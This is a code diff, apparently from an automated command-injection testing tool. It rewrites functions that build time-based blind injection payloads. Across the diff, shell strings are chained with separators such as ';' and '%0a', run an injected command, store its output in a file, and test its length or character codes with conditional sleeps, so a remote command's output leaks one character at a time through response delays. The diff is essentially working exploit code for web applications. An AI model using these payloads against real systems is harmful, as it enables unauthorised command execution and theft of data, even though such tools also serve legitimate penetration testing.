@@ -54,11 +54,11 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
                 "str=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 "str=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
-                "str1=" + settings.CMD_SUB_PREFIX + "expr length \"$str\"" + settings.CMD_SUB_SUFFIX + separator +
-                #"str1=${%23str}" + separator +
-                "if [ " + str(j) + " -ne ${str1} ]" + separator +
-                "then sleep 0" + separator +
-                "else sleep " + str(timesec) + separator +
+                # "str1=" + settings.CMD_SUB_PREFIX + "expr length \"$str\"" + settings.CMD_SUB_SUFFIX + separator +
+                "str1=${#str}" + separator +
+                "if [ " + str(j) + " -eq ${str1} ]" + separator +
+                # "then sleep 0" + separator +
+                "then sleep " + str(timesec) + separator +
                 "fi"
                 )
 
@@ -69,8 +69,8 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
                 "sleep 0" + separator +
                 "str=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 "str=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
-                "str1=" + settings.CMD_SUB_PREFIX + "expr length \"$str\"" + settings.CMD_SUB_SUFFIX + separator +
-                #"str1=${%23str} " + separator +
+                #"str1=" + settings.CMD_SUB_PREFIX + "expr length \"$str\"" + settings.CMD_SUB_SUFFIX + separator +
+                "str1=${#str} " + separator +
                 "[ " + str(j) + " -eq ${str1} ] " + separator +
                 "sleep " + str(timesec)
                 )
@@ -122,9 +122,9 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output, using readline().
                 "str1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\"" + settings.CMD_SUB_SUFFIX + separator +
-                "if [ " + str(j) + " -ne ${str1} ]" + separator +
-                "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
-                "else " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
+                "if [ " + str(j) + " -eq ${str1} ]" + separator +
+                # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
+                "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 "fi"
                 )
 
@@ -212,13 +212,13 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 "echo $str > " + OUTPUT_TEXTFILE + separator +
                 "str=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
-                "str1=" + settings.CMD_SUB_PREFIX + "expr length \"$str\"" + settings.CMD_SUB_SUFFIX + separator +
-                #"str1=${%23str}" + separator +
-                "if [ " + str(j) + " -ne ${str1} ]" + separator +
-                "then sleep 0 " + separator +
-                "else sleep " + str(timesec) + separator +
+                #"str1=" + settings.CMD_SUB_PREFIX + "expr length \"$str\"" + settings.CMD_SUB_SUFFIX + separator +
+                "str1=${#str}" + separator +
+                "if [ " + str(j) + " -eq ${str1} ]" + separator +
+                # "then sleep 0 " + separator +
+                "then sleep " + str(timesec) + separator +
                 # Transform to ASCII
-                "str1=" + settings.CMD_SUB_PREFIX + "od -A n -t d1 < " +OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
+                "str1=" + settings.CMD_SUB_PREFIX + "od -A n -t d1 < " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 "echo $str1 > " + OUTPUT_TEXTFILE + separator +
                 "fi"
                 )
@@ -232,8 +232,8 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 "echo $str" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator +
                 "str=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
-                "str1=" + settings.CMD_SUB_PREFIX + "expr length \"$str\"" + settings.CMD_SUB_SUFFIX + separator +
-                #"str1=${%23str}" + separator +
+                #"str1=" + settings.CMD_SUB_PREFIX + "expr length \"$str\"" + settings.CMD_SUB_SUFFIX + separator +
+                "str1=${#str}" + separator +
                 "[ " + str(j) + " -eq ${str1} ]" + separator +
                 "sleep " + str(timesec) + separator +
                 # Transform to ASCII
@@ -294,9 +294,9 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output, using readline().
                 "str1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\"" + settings.CMD_SUB_SUFFIX + separator +
-                "if [ " + str(j) + " -ne ${str1} ] " + separator +
-                "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
-                "else " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
+                "if [ " + str(j) + " -eq ${str1} ] " + separator +
+                # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
+                "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 "fi"
                 )
 
@@ -364,9 +364,9 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
       payload = (separator +
                 # Use space as delimiter
                 "str=" + settings.CMD_SUB_PREFIX + "cut -d ' ' -f " + str(num_of_chars) + " < " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
-                "if [ " + str(ascii_char) + " -ne ${str} ]" + separator +
-                "then sleep 0" + separator +
-                "else sleep " + str(timesec) + separator +
+                "if [ " + str(ascii_char) + " -eq ${str} ]" + separator +
+                # "then sleep 0" + separator +
+                "then sleep " + str(timesec) + separator +
                 "fi"
                 )
 
@@ -427,9 +427,9 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, t
     if separator == ";"  or separator == "%0a" :
       payload = (separator +
                 "str=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(ord(file.readlines()[0][" + str(num_of_chars - 1) + "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
-                "if [ " + str(ascii_char) + " -ne ${str} ]" + separator +
-                "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
-                "else " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
+                "if [ " + str(ascii_char) + " -eq ${str} ]" + separator +
+                # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
+                "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 "fi"
                 )
 
@@ -492,9 +492,9 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
     if separator == ";"  or separator == "%0a" :
       payload = (separator +
                 "str=" + settings.CMD_SUB_PREFIX + "cut -c1-2 " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
-                "if [ " + str(ord(str(ascii_char))) + " -ne ${str} ]" + separator +
-                "then sleep 0" + separator +
-                "else sleep " + str(timesec) + separator +
+                "if [ " + str(ord(str(ascii_char))) + " -eq ${str} ]" + separator +
+                # "then sleep 0" + separator +
+                "then sleep " + str(timesec) + separator +
                 "fi"
                 )
 
@@ -549,9 +549,9 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
     if separator == ";"  or separator == "%0a" :
       payload = (separator +
                 "str=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "])\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
-                "if [ " + str(ascii_char) + " -ne ${str} ]" + separator +
-                "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
-                "else " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
+                "if [ " + str(ascii_char) + " -eq ${str} ]" + separator +
+                # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
+                "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 "fi"
                 )
 
